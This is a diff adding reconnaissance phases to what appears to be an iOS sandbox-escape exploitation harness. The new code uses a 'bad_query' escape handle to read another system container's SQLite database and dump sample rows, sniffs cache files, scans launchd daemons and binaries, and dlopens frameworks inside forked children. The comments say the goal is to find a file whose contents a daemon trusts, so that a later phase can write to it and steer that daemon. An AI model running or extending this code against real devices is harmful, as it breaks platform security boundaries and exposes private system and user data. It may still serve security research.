@@ -47,6 +47,7 @@ enum { V_PING = 1, V_MAKE = 2, V_EXIT = 3 };
 #include <sys/mman.h>
 #include <fcntl.h>
 #include <unistd.h>
+#include <sqlite3.h>
 #include <stdarg.h>
 #include <sys/sysctl.h>
 #include <sys/ioctl.h>
@@ -26703,6 +26704,2149 @@ static void p_bq9(void) {
 }
 
 // ---------------------------------------------------------------------------
+// V176 (p_bq10): the two remaining "input file" candidates from §180, as
+// reconnaissance only — no writes in this phase, ever.
+//
+// §180 closed the accessories plist as OUTPUT of findmydeviced: editing it
+// changes a display, not the daemon. The hypothesis "some file is INPUT —
+// the daemon reads state from it, so writing it changes what the daemon
+// does" still has two live candidates:
+//
+//  1. 8EB68272/db — a live SQLite with WAL, mtime moving (§178/§176).
+//     A database is usually BOTH input and output: whatever daemon loads
+//     config/queue/state from, it also stores results in. If tables are
+//     config-shaped, a write there could steer the daemon; if pure logs,
+//     it is another vitrine. Schema answers this directly.
+//  2. 867912A4/Library/Caches/functions.{data,list} — a cache whose pair
+//     moved together (+297 s, size 393216 / 4868→4980) in §178. Cache is
+//     nominally derived data (output), but "functions.list" smells like an
+//     index the daemon consults. Format sniffing tells which.
+//
+// READ-ONLY phase: header dumps, sqlite_master schema + row counts (SELECT
+// only), format detection. Identifying WHO consumes a file is the point —
+// the write experiment, if the schema justifies one, is a later phase with
+// its own backup/rollback discipline (§175/§180 template).
+// ---------------------------------------------------------------------------
+
+static void p_bq10(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq10] v176 input-file candidates: sqlite schema + cache format (READ-ONLY)");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq10] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq10] done"); return; }
+
+    // ---- 1. SQLite 8EB68272/db: header + schema + row counts.
+    {
+        const char *dbp = "/var/containers/Data/System/"
+            "8EB68272-6502-49E9-B688-25CA4774CFE4/db";
+        struct stat st = {0};
+        if (stat(dbp, &st) != 0) {
+            LOG("[bq10] db: stat errno %d — candidate gone", errno);
+        } else {
+            LOG("[bq10] db: %lld bytes, mtime %lld, uid=%d gid=%d mode=%o",
+                (long long)st.st_size, (long long)st.st_mtime,
+                (int)st.st_uid, (int)st.st_gid, (unsigned)(st.st_mode & 0777));
+            // File owner uid/gid is the ownership fingerprint the EPERM'd
+            // metadata plist would have given us (§179): system containers
+            // are owned by the daemon's user, so uid narrows the consumer
+            // class (501=mobile, 0=root, other=dedicated daemon account).
+            // WAL database opened readonly may need the -shm segment; try
+            // the honest readonly open first, fall back to immutable=1
+            // (reads the main file, ignores WAL — noted in output so a
+            // stale view is never mistaken for the live one).
+            sqlite3 *db = NULL;
+            int rc = sqlite3_open_v2(dbp, &db, SQLITE_OPEN_READONLY, NULL);
+            BOOL immutable = NO;
+            if (rc != SQLITE_OK) {
+                if (db) { sqlite3_close(db); db = NULL; }
+                NSString *u = [NSString stringWithFormat:@"file:%s?immutable=1", dbp];
+                rc = sqlite3_open_v2(u.UTF8String, &db, SQLITE_OPEN_READONLY, NULL);
+                immutable = (rc == SQLITE_OK);
+            }
+            if (rc != SQLITE_OK) {
+                LOG("[bq10] db: open rc=%d (%s) — cannot read schema", rc,
+                    db ? sqlite3_errmsg(db) : "?");
+                if (db) sqlite3_close(db);
+            } else {
+                LOG("[bq10] db: open OK%s",
+                    immutable ? " (immutable=1 — WAL state NOT applied, view may be stale)"
+                              : " (readonly, WAL applied)");
+                sqlite3_stmt *st2 = NULL;
+                int rc2 = sqlite3_prepare_v2(db,
+                    "SELECT type, name, (SELECT count(*) FROM sqlite_master) AS _c "
+                    "FROM sqlite_master WHERE type IN ('table','view') "
+                    "ORDER BY type, name", -1, &st2, NULL);
+                if (rc2 != SQLITE_OK) {
+                    LOG("[bq10] db: schema query rc=%d (%s)", rc2,
+                        sqlite3_errmsg(db));
+                } else {
+                    int rows = 0;
+                    while (sqlite3_step(st2) == SQLITE_ROW) {
+                        const char *type = (const char *)sqlite3_column_text(st2, 0);
+                        const char *name = (const char *)sqlite3_column_text(st2, 1);
+                        rows++;
+                        // Row count per table: SELECT-only, safe on a live db.
+                        char q[512];
+                        sqlite3_stmt *cs = NULL;
+                        long long cnt = -1;
+                        snprintf(q, sizeof(q), "SELECT count(*) FROM \"%s\"",
+                                 name ? name : "?");
+                        if (sqlite3_prepare_v2(db, q, -1, &cs, NULL) == SQLITE_OK) {
+                            if (sqlite3_step(cs) == SQLITE_ROW)
+                                cnt = sqlite3_column_int64(cs, 0);
+                            sqlite3_finalize(cs);
+                        }
+                        LOG("[bq10]   %-6s %-48s rows=%lld", type, name, cnt);
+                    }
+                    sqlite3_finalize(st2);
+                    LOG("[bq10] db: %d tables/views", rows);
+                }
+                // application_id / user_version — ownership fingerprints
+                // (SQLite headers carry both; app id is set by the creator).
+                sqlite3_stmt *pv = NULL;
+                if (sqlite3_prepare_v2(db,
+                        "PRAGMA application_id", -1, &pv, NULL) == SQLITE_OK &&
+                    sqlite3_step(pv) == SQLITE_ROW) {
+                    LOG("[bq10]   application_id=%d",
+                        sqlite3_column_int(pv, 0));
+                }
+                if (pv) sqlite3_finalize(pv);
+                pv = NULL;
+                if (sqlite3_prepare_v2(db, "PRAGMA user_version", -1, &pv, NULL)
+                        == SQLITE_OK && sqlite3_step(pv) == SQLITE_ROW) {
+                    LOG("[bq10]   user_version=%d", sqlite3_column_int(pv, 0));
+                }
+                if (pv) sqlite3_finalize(pv);
+
+                // Sample rows (SELECT-only, LIMIT 3): the whole question
+                // about this database is WHAT KIND of data feeds carry —
+                // config the daemon consumes (input) or records it emits
+                // (output). Table names alone ("feedEntries") do not tell;
+                // column values (URLs, ids, timestamps) do.
+                const char *sample_tables[2] = {"feedEntries", "feedMetadata"};
+                for (int ti = 0; ti < 2; ti++) {
+                    const char *tn = sample_tables[ti];
+                    sqlite3_stmt *rs = NULL;
+                    char q[256];
+                    snprintf(q, sizeof(q), "SELECT * FROM \"%s\" LIMIT 3", tn);
+                    if (sqlite3_prepare_v2(db, q, -1, &rs, NULL) != SQLITE_OK) {
+                        LOG("[bq10]   %s: select rc=%s", tn, sqlite3_errmsg(db));
+                        continue;
+                    }
+                    int ncols = sqlite3_column_count(rs);
+                    while (sqlite3_step(rs) == SQLITE_ROW) {
+                        NSMutableString *row = [NSMutableString string];
+                        for (int c = 0; c < ncols && c < 12; c++) {
+                            const char *cn = sqlite3_column_name(rs, c);
+                            int ct = sqlite3_column_type(rs, c);
+                            if (ct == SQLITE_NULL) {
+                                [row appendFormat:@"%s=NULL ", cn];
+                            } else if (ct == SQLITE_TEXT) {
+                                const char *v = (const char *)sqlite3_column_text(rs, c);
+                                NSString *s = v ? [NSString stringWithUTF8String:v] : @"?";
+                                if (s.length > 70)
+                                    s = [[s substringToIndex:70] stringByAppendingString:@"…"];
+                                [row appendFormat:@"%s=\"%s\" ", cn, s.UTF8String];
+                            } else if (ct == SQLITE_INTEGER) {
+                                [row appendFormat:@"%s=%lld ", cn,
+                                    sqlite3_column_int64(rs, c)];
+                            } else if (ct == SQLITE_BLOB) {
+                                [row appendFormat:@"%s=blob(%d) ", cn,
+                                    sqlite3_column_bytes(rs, c)];
+                            } else {
+                                [row appendFormat:@"%s=%s ", cn,
+                                    sqlite3_column_decltype(rs, c) ?: "?"];
+                            }
+                        }
+                        LOG("[bq10]   %s: %s", tn, row.UTF8String);
+                    }
+                    sqlite3_finalize(rs);
+                }
+                sqlite3_close(db);
+            }
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- 2. functions.{data,list}: header sniff + a few lines.
+    {
+        const char *base = "/var/containers/Data/System/"
+            "867912A4-A70D-428C-9551-D28453B6F1B4/Library/Caches/functions";
+        for (int i = 0; i < 2; i++) {
+            char p[1024];
+            snprintf(p, sizeof(p), "%s.%s", base, i ? "list" : "data");
+            int fd = open(p, O_RDONLY);
+            if (fd < 0) { LOG("[bq10] %s: open errno %d", p, errno); continue; }
+            unsigned char buf[96];
+            ssize_t n = read(fd, buf, sizeof(buf));
+            close(fd);
+            if (n < 8) { LOG("[bq10] %s: short read %zd", p, n); continue; }
+            const char *fmt = "unknown";
+            if (!memcmp(buf, "bplist0", 7)) fmt = "NSKeyedArchiver/bplist";
+            else if (buf[0] == 0x30) fmt = "ASN.1/DER";
+            else if (!memcmp(buf, "SQLite format 3", 15)) fmt = "SQLite";
+            else if (!memcmp(buf, "$archiver", 9)) fmt = "XML plist";
+            else if (buf[0] == '{' || (buf[0] < 0x80 && buf[0] >= 0x20 &&
+                     !memcmp(buf, "{\"", 2))) fmt = "JSON";
+            BOOL printable = YES;
+            for (ssize_t j = 0; j < n && j < 48; j++)
+                if (buf[j] && (buf[j] < 9 || buf[j] > 126)) { printable = NO; break; }
+            LOG("[bq10] %s.%s: %s, first bytes: %s", base,
+                i ? "list" : "data", fmt, printable ? "printable-text" : "binary");
+            // Hex+ascii line of the first 48 bytes for the record.
+            char line[200]; int o = 0;
+            for (ssize_t j = 0; j < n && j < 48 && o < 150; j++)
+                o += snprintf(line + o, sizeof(line) - o, "%02x", buf[j]);
+            LOG("[bq10]   hex: %s", line);
+            if (printable) {
+                char txt[97]; ssize_t m = n < 96 ? n : 96;
+                memcpy(txt, buf, (size_t)m); txt[m] = 0;
+                LOG("[bq10]   txt: %s", txt);
+            }
+            // Longest printable runs in the first 4 KB: UUIDs, class names
+            // and paths in this file identify its owner and purpose
+            // (a "functions" index of what, exactly).
+            if (i == 1) {
+                unsigned char big[4096];
+                int fd2 = open(p, O_RDONLY);
+                ssize_t nb = fd2 >= 0 ? read(fd2, big, sizeof(big)) : -1;
+                if (fd2 >= 0) close(fd2);
+                int runs = 0;
+                char run[128]; int rl = 0;
+                for (ssize_t j = 0; j < nb && runs < 20; j++) {
+                    char ch = (char)big[j];
+                    if (ch >= 0x20 && ch < 0x7f && rl < 127) {
+                        run[rl++] = ch;
+                    } else {
+                        if (rl >= 12) { run[rl] = 0;
+                            LOG("[bq10]   str: %s", run); runs++; }
+                        rl = 0;
+                    }
+                }
+            }
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- 3. Who owns the "feed" subsystem? Two independent signals:
+    // launchd labels matching the subsystem vocabulary (bq8's method —
+    // the metadata plist that would answer directly is EPERM, §179), and
+    // file uid from section 1. A hit gives us a daemon name to attach to
+    // both candidates.
+    {
+        const char *needles[] = { "intent", "knowledge", "feed", "siri",
+                                  "intelligence" };
+        DIR *d = opendir("/System/Library/LaunchDaemons");
+        struct dirent *e;
+        int hits = 0;
+        while (d && (e = readdir(d))) {
+            if (e->d_name[0] == '.') continue;
+            NSString *nm = [NSString stringWithUTF8String:e->d_name];
+            BOOL hit = NO;
+            for (unsigned i = 0; i < sizeof(needles)/sizeof(needles[0]); i++)
+                if ([nm rangeOfString:[NSString stringWithUTF8String:needles[i]]
+                        options:NSCaseInsensitiveSearch].location != NSNotFound)
+                    hit = YES;
+            if (!hit) continue;
+            char p[1024];
+            snprintf(p, sizeof(p), "/System/Library/LaunchDaemons/%s", e->d_name);
+            NSData *dd = [NSData dataWithContentsOfFile:
+                [NSString stringWithUTF8String:p] options:0 error:nil];
+            NSString *s = dd.length ? [[NSString alloc] initWithData:dd
+                encoding:NSUTF8StringEncoding] : nil;
+            NSString *user = nil;
+            if (s) {
+                NSRange r = [s rangeOfString:@"<key>UserName</key>"];
+                if (r.location != NSNotFound) {
+                    // Clamp every search range to the string length: a
+                    // UserName near EOF threw NSRangeException once and
+                    // killed the phase (the pattern is older than §144 —
+                    // an uncaught exception is just a broken detector).
+                    NSUInteger rest = s.length > r.location + r.length
+                        ? s.length - (r.location + r.length) : 0;
+                    NSUInteger win = MIN((NSUInteger)200, rest);
+                    NSRange v = [s rangeOfString:@"<string>"
+                        options:0
+                        range:NSMakeRange(r.location + r.length, win)];
+                    if (v.location != NSNotFound && v.location + 8 <= s.length) {
+                        NSUInteger rest2 = s.length - v.location;
+                        NSUInteger win2 = MIN((NSUInteger)200, rest2);
+                        NSRange e2 = [s rangeOfString:@"</string>" options:0
+                            range:NSMakeRange(v.location, win2)];
+                        if (e2.location != NSNotFound)
+                            user = [s substringWithRange:
+                                NSMakeRange(v.location + 8,
+                                           e2.location - v.location - 8)];
+                    }
+                }
+            }
+            LOG("[bq10]   launchd-match %-46s user=%s", e->d_name,
+                user ? user.UTF8String : "(root/default)");
+            hits++;
+        }
+        if (d) closedir(d);
+        LOG("[bq10] launchd label hits: %d", hits);
+        fsync(fileno(stderr));
+    }
+
+    bad_query_release(h);
+    LOG("[bq10] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq11): identify the owner of the AppIntents feed DB (§181) by
+// who KNOWS its schema.
+//
+// bq10 found the candidates but label-name matches are not ownership: 22
+// launchd labels contain intent/knowledge/feed, the DB is uid=501. The
+// schema strings ("feedEntries", "feedMetadata", the cache names
+// "functions.list"/"functions.data") exist only in the binary of whoever
+// created these files — so scanning daemon binaries for them is a
+// definitive answer, the same way §177 identified softposreaderd from its
+// bundle. READ-ONLY: mmap each program and memmem for the needles; errno
+// is counted, not silently skipped (a denial must not read as "not owner").
+// ---------------------------------------------------------------------------
+
+static void p_bq11(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq11] v176 feed-DB owner: scan daemon binaries for schema strings");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq11] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq11] done"); return; }
+
+    const char *needles[] = { "feedEntries", "feedMetadata",
+                              "functions.list", "groupingInfo" };
+    const unsigned nneedles = 4;
+
+    // Programs referenced by launchd (Program / ProgramArguments[0]).
+    NSMutableArray *progs = [NSMutableArray array];
+    NSMutableArray *labels = [NSMutableArray array];
+    const char *dirs[] = { "/System/Library/LaunchDaemons",
+                           "/System/Library/LaunchAgents" };
+    for (unsigned di = 0; di < 2; di++) {
+        DIR *d = opendir(dirs[di]);
+        struct dirent *e;
+        while (d && (e = readdir(d))) {
+            if (e->d_name[0] == '.') continue;
+            char p[1024];
+            snprintf(p, sizeof(p), "%s/%s", dirs[di], e->d_name);
+            NSData *dd = [NSData dataWithContentsOfFile:
+                [NSString stringWithUTF8String:p] options:0 error:nil];
+            NSString *s = dd.length ? [[NSString alloc] initWithData:dd
+                encoding:NSUTF8StringEncoding] : nil;
+            if (!s) continue;
+            NSString *prog = nil;
+            // Program first, then ProgramArguments[0] — enough to reach
+            // the binary; label correlates the hit back to the daemon.
+            NSRange r = [s rangeOfString:@"<key>Program</key>"];
+            if (r.location == NSNotFound)
+                r = [s rangeOfString:@"<key>ProgramArguments</key>"];
+            if (r.location != NSNotFound && r.location + 60 < s.length) {
+                NSRange v = [s rangeOfString:@"<string>"
+                    options:0
+                    range:NSMakeRange(r.location,
+                        MIN((NSUInteger)300, s.length - r.location))];
+                if (v.location != NSNotFound && v.location + 9 < s.length) {
+                    NSRange e2 = [s rangeOfString:@"</string>" options:0
+                        range:NSMakeRange(v.location + 8,
+                            MIN((NSUInteger)300, s.length - v.location - 8))];
+                    if (e2.location != NSNotFound)
+                        prog = [s substringWithRange:NSMakeRange(
+                            v.location + 8, e2.location - v.location - 8)];
+                }
+            }
+            if (prog && [prog hasPrefix:@"/"]) {
+                [progs addObject:prog];
+                [labels addObject:[NSString stringWithUTF8String:e->d_name]];
+            }
+        }
+        if (d) closedir(d);
+    }
+    LOG("[bq11] programs collected: %d", (int)progs.count);
+    fsync(fileno(stderr));
+
+    int scanned = 0, denied = 0, empty = 0, hits = 0;
+    for (NSUInteger i = 0; i < progs.count; i++) {
+        NSString *pp = progs[i];
+        NSError *err = nil;
+        NSData *dd = [NSData dataWithContentsOfFile:pp
+            options:NSDataReadingMappedIfSafe error:&err];
+        if (dd.length == 0) {
+            // Not "not the owner": the binary was unreachable. Count it —
+            // an unscanned binary is an unknown, and unknowns must be
+            // visible in the log (§144 discipline).
+            denied++;
+            if (denied <= 25)
+                LOG("[bq11]   DENIED %s (%s)", pp.UTF8String,
+                    err.localizedDescription.UTF8String ?: "?");
+            continue;
+        }
+        scanned++;
+        const unsigned char *b = dd.bytes;
+        NSUInteger len = dd.length;
+        for (unsigned n = 0; n < nneedles; n++) {
+            const char *nd = needles[n];
+            size_t nl = strlen(nd);
+            if (len < nl) continue;
+            const unsigned char *f = memmem(b, len, nd, nl);
+            if (f) {
+                NSString *lab = labels[i];
+                LOG("[bq11]   HIT %-56s <- \"%s\"",
+                    lab.UTF8String, nd);
+                hits++;
+                break;
+            }
+        }
+        if ((i & 63) == 63) { LOG("[bq11] ... %d/%d scanned", (int)i + 1,
+            (int)progs.count); fsync(fileno(stderr)); }
+    }
+    LOG("[bq11] scanned=%d denied=%d empty=%d hits=%d",
+        scanned, denied, empty, hits);
+    fsync(fileno(stderr));
+
+    // The 108 denials are all /usr/libexec (sandbox blocks it, §182): the
+    // owner may well live there — siriknowledged itself is in the denied
+    // set. Test whether the bad_query escape can be requested FOR that
+    // root: if the token grants /usr/libexec, the same scan runs over the
+    // blind spot; if not, that is a closed question with a proven detector.
+    if (denied) {
+        int64_t h2 = bq_custom("/usr/libexec", 0, grp, 7, F_DEF, 3);
+        LOG("[bq11] escape for /usr/libexec -> handle %lld%s",
+            (long long)h2, h2 < 0 ? " (refused — blind spot stands)" : "");
+        fsync(fileno(stderr));
+        if (h2 >= 0) {
+            int rescanned = 0, rehits = 0;
+            for (NSUInteger i = 0; i < progs.count; i++) {
+                NSString *pp = progs[i];
+                if (![pp hasPrefix:@"/usr/"]) continue;
+                NSData *dd = [NSData dataWithContentsOfFile:pp
+                    options:NSDataReadingMappedIfSafe error:nil];
+                if (dd.length == 0) continue;
+                rescanned++;
+                const unsigned char *b = dd.bytes;
+                for (unsigned n = 0; n < nneedles; n++) {
+                    if (memmem(b, dd.length, needles[n], strlen(needles[n]))) {
+                        NSString *lab = labels[i];
+                        LOG("[bq11]   HIT-via-escape %-50s <- \"%s\"",
+                            lab.UTF8String, needles[n]);
+                        rehits++;
+                        break;
+                    }
+                }
+            }
+            LOG("[bq11] /usr/libexec: rescanned=%d hits=%d", rescanned, rehits);
+            bad_query_release(h2);
+        }
+        fsync(fileno(stderr));
+    }
+
+    bad_query_release(h);
+    LOG("[bq11] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq12): same owner hunt as bq11, but in the readable region.
+//
+// bq11 answered two things: the escape refuses /usr/libexec (handle -3),
+// so daemon binaries — including siriknowledged — are permanently out of
+// reach from the sandbox; and mediaremoted knows the feed schema. The
+// schema code itself (feedEntries / feedMetadata / the functions cache)
+// is framework code that daemons LINK, and frameworks under
+// /System/Library are readable. Scanning them separates "who produces the
+// feed" (mediaremoted, already known) from "who defines/consumes it" —
+// the framework that owns the schema names the subsystem, and its XPC
+// service name names the daemon.
+// READ-ONLY, same discipline as bq11: denials counted and logged.
+// ---------------------------------------------------------------------------
+
+static void p_bq12(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq12] v176 feed-schema owner: scan /System/Library frameworks");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq12] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq12] done"); return; }
+
+    const char *needles[] = { "feedEntries", "feedMetadata", "functions.list",
+                              "AppIntentsEntityFeed" };
+    const unsigned nneedles = 4;
+
+    // Framework main binaries: Foo.framework/Foo (and Versions/Current).
+    NSMutableArray *bins = [NSMutableArray array];
+    NSMutableArray *names = [NSMutableArray array];
+    const char *fwroots[] = { "/System/Library/PrivateFrameworks",
+                              "/System/Library/Frameworks" };
+    for (unsigned fr = 0; fr < 2; fr++) {
+        errno = 0;
+        DIR *d = opendir(fwroots[fr]);
+        if (!d) {
+            // opendir denial must be visible: "8 collected" from a root
+            // with 150+ frameworks is a broken instrument, not a result.
+            LOG("[bq12] opendir %s: errno %d", fwroots[fr], errno);
+            fsync(fileno(stderr));
+            continue;
+        }
+        int seen = 0, matched = 0;
+        struct dirent *e;
+        while ((e = readdir(d))) {
+            if (strstr(e->d_name, ".framework") == NULL) continue;
+            seen++;
+            NSString *fw = [NSString stringWithFormat:@"%s/%s",
+                fwroots[fr], e->d_name];
+            NSString *dn = [NSString stringWithUTF8String:e->d_name];
+            NSString *base = [dn substringToIndex:
+                dn.length - strlen(".framework")];
+            NSString *cands[3] = {
+                [NSString stringWithFormat:@"%@/%@", fw, base],
+                [NSString stringWithFormat:@"%@/Versions/A/%@", fw, base],
+                [NSString stringWithFormat:@"%@/%@.dylib", fw, base],
+            };
+            int firstErrno = 0;
+            for (unsigned c = 0; c < 3; c++) {
+                struct stat st;
+                errno = 0;
+                if (stat(cands[c].fileSystemRepresentation, &st) == 0 &&
+                    S_ISREG(st.st_mode) && st.st_size > 4096) {
+                    [bins addObject:cands[c]];
+                    [names addObject:base];
+                    matched++;
+                    break;
+                }
+                if (c == 0) firstErrno = errno;
+            }
+            if (firstErrno && matched == 0 && seen <= 5)
+                LOG("[bq12]   cand0 stat errno %d for %s/%s",
+                    firstErrno, e->d_name, base.UTF8String);
+        }
+        closedir(d);
+        LOG("[bq12] %s: %d .framework dirs, %d main binaries found",
+            fwroots[fr], seen, matched);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq12] framework binaries collected: %d", (int)bins.count);
+    fsync(fileno(stderr));
+
+    int scanned = 0, denied = 0, hits = 0;
+    for (NSUInteger i = 0; i < bins.count; i++) {
+        NSError *err = nil;
+        NSData *dd = [NSData dataWithContentsOfFile:bins[i]
+            options:NSDataReadingMappedIfSafe error:&err];
+        if (dd.length == 0) {
+            denied++;
+            if (denied <= 15)
+                LOG("[bq12]   DENIED %s (%s)",
+                    [bins[i] lastPathComponent].UTF8String,
+                    err.localizedDescription.UTF8String ?: "?");
+            continue;
+        }
+        scanned++;
+        const unsigned char *b = dd.bytes;
+        for (unsigned n = 0; n < nneedles; n++) {
+            if (memmem(b, dd.length, needles[n], strlen(needles[n]))) {
+                NSString *nm = names[i];
+                LOG("[bq12]   HIT %-48s <- \"%s\"", nm.UTF8String, needles[n]);
+                hits++;
+                break;
+            }
+        }
+        if ((i & 127) == 127) { LOG("[bq12] ... %d/%d", (int)i + 1,
+            (int)bins.count); fsync(fileno(stderr)); }
+    }
+    LOG("[bq12] scanned=%d denied=%d hits=%d", scanned, denied, hits);
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq12] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq13): the feed-schema owner hunt via the dyld shared cache.
+//
+// bq12 failed honestly: 3129 framework dirs, main binaries ENOENT — they
+// live in the dyld shared cache, not on disk, so no file scan can see
+// them (only 8 stragglers exist as files; none matched). The cache IS
+// mapped into every process, including ours, so dlopen() + memmem() over
+// the loaded image is the same read the kernel would serve, just from
+// our own address space. Frameworks are loadable by name from
+// /System/Library regardless of the shared cache layout.
+//
+// Filter: name keywords first (intent/knowledge/siri/feed/intelligence/
+// spotlight/entity) — loading all 3129 would churn memory for nothing.
+// A hit names the framework that OWNS the feed schema; its XPC/Mach
+// service names in the same image name the daemon. READ-ONLY: dlopen
+// with RTLD_LAZY, dlclose after the scan, no symbols called.
+// ---------------------------------------------------------------------------
+
+static void p_bq13(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq13] v176 feed-schema owner via dlopen'd images");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq13] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq13] done"); return; }
+
+    const char *needles[] = { "feedEntries", "feedMetadata", "functions.list",
+                              "functions.data" };
+    const unsigned nneedles = 4;
+    const char *kw[] = { "intent", "knowledge", "siri", "feed", "intelligence",
+                         "spotlight", "entity", "appintents" };
+    const unsigned nkw = 8;
+
+    // Candidate framework names from the keyword filter.
+    NSMutableArray *cands = [NSMutableArray array];
+    const char *fwroots[] = { "/System/Library/PrivateFrameworks",
+                              "/System/Library/Frameworks" };
+    for (unsigned fr = 0; fr < 2; fr++) {
+        DIR *d = opendir(fwroots[fr]);
+        struct dirent *e;
+        while (d && (e = readdir(d))) {
+            if (!strstr(e->d_name, ".framework")) continue;
+            NSString *dn = [NSString stringWithUTF8String:e->d_name];
+            NSString *lower = dn.lowercaseString;
+            BOOL keep = NO;
+            for (unsigned k = 0; k < nkw; k++)
+                if ([lower rangeOfString:[NSString stringWithUTF8String:kw[k]]]
+                        .location != NSNotFound) keep = YES;
+            if (keep) [cands addObject:[NSString stringWithFormat:@"%s/%@",
+                fwroots[fr], dn]];
+        }
+        if (d) closedir(d);
+    }
+    LOG("[bq13] keyword candidates: %d", (int)cands.count);
+    fsync(fileno(stderr));
+
+    int loaded = 0, failed = 0, hits = 0, crashed = 0;
+    for (NSString *fw in cands) {
+        // dlopen wants the BINARY inside the bundle, not the .framework
+        // directory: opening the dir failed all 315 times (v176) and the
+        // reason was only visible because dlerror is logged below.
+        NSString *base = [fw.lastPathComponent stringByDeletingPathExtension];
+        NSString *bin = [NSString stringWithFormat:@"%@/%@", fw, base];
+        // dlopen runs the image's initializers — SiriSignals killed the
+        // whole process on the first attempt (three builds in a row died
+        // right after "opened SiriSignals", before any of our own scan
+        // code ran). Isolate each attempt in a fork(): the child dlopens,
+        // scans, and reports through a pipe; the parent survives any
+        // signal the child takes. fork-in-sandbox is proven in p_victim.
+        int fds[2];
+        if (pipe(fds) != 0) {
+            LOG("[bq13]   pipe errno %d", errno);
+            failed++; continue;
+        }
+        pid_t pid = fork();
+        if (pid < 0) {
+            // fork refused (sandbox?) — without this log the run reads
+            // as "all dlopens failed" when the isolation itself broke.
+            LOG("[bq13]   fork errno %d", errno);
+            close(fds[0]); close(fds[1]);
+            failed++; continue;
+        }
+        if (pid == 0) {
+            close(fds[0]);
+            char res = 'F';
+            void *mh = dlopen(bin.fileSystemRepresentation, RTLD_LAZY);
+            if (!mh) {
+                // dlerror text must reach the parent: "dlopen-fail" with
+                // no reason is the same blindness as a silent errno.
+                const char *de = dlerror();
+                res = 'E';
+                write(fds[1], &res, 1);
+                if (de) write(fds[1], de,
+                    strlen(de) > 100 ? 100 : strlen(de));
+                _exit(0);
+            }
+            if (mh) {
+                struct mach_header_64 *mh64 = (struct mach_header_64 *)mh;
+                res = 'O';
+                if (mh64->magic == MH_MAGIC_64) {
+                    struct segment_command_64 *seg = NULL;
+                    struct load_command *lc = (struct load_command *)(mh64 + 1);
+                    for (unsigned i = 0; i < mh64->ncmds; i++) {
+                        if (lc->cmd == LC_SEGMENT_64 && !strcmp(
+                                ((struct segment_command_64 *)lc)->segname,
+                                "__TEXT")) {
+                            seg = (struct segment_command_64 *)lc; break;
+                        }
+                        lc = (struct load_command *)((char *)lc + lc->cmdsize);
+                    }
+                    if (seg && seg->vmsize) {
+                        const unsigned char *bimg = (const unsigned char *)mh;
+                        size_t blen = seg->vmsize < (4ULL << 20)
+                            ? (size_t)seg->vmsize : (4ULL << 20);
+                        for (unsigned n = 0; n < nneedles; n++)
+                            if (memmem(bimg, blen, needles[n],
+                                       strlen(needles[n]))) {
+                                res = 'H';
+                                // type byte FIRST, then the needle — the
+                                // parent reads buf[0] as the verdict.
+                                write(fds[1], &res, 1);
+                                write(fds[1], needles[n],
+                                    strlen(needles[n]));
+                                _exit(0);
+                            }
+                    }
+                }
+            }
+            write(fds[1], &res, 1);
+            _exit(0);
+        }
+        close(fds[1]);
+        char buf[128] = {0};
+        ssize_t nr = read(fds[0], buf, sizeof(buf) - 1);
+        close(fds[0]);
+        int status = 0;
+        waitpid(pid, &status, 0);
+        if (WIFSIGNALED(status)) {
+            // Child died from a signal — the framework's own initializers
+            // are hostile to this context. Counted, not hidden: such a
+            // framework is unscanned (unknown), never "no hit".
+            crashed++;
+            if (crashed <= 10)
+                LOG("[bq13]   CRASH %s (sig %d)", base.UTF8String,
+                    WTERMSIG(status));
+        } else if (nr > 0 && buf[0] == 'H') {
+            LOG("[bq13]   HIT %s <- \"%s\"", base.UTF8String,
+                buf + 1);
+            hits++;
+        } else if (nr > 0 && buf[0] == 'O') {
+            loaded++;
+        } else if (nr > 0 && buf[0] == 'E') {
+            failed++;
+            if (failed <= 3) {
+                buf[nr < 127 ? nr : 127] = 0;
+                LOG("[bq13]   dlopen-err %s: %s", base.UTF8String, buf + 1);
+            }
+        } else {
+            failed++;
+            if (failed <= 5)
+                LOG("[bq13]   dlopen-fail %s", base.UTF8String);
+        }
+        fsync(fileno(stderr));
+    }
+    LOG("[bq13] ok=%d failed=%d crashed=%d hits=%d",
+        loaded, failed, crashed, hits);
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq13] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq14): the dyld shared cache as the oracle for feed-DB ownership.
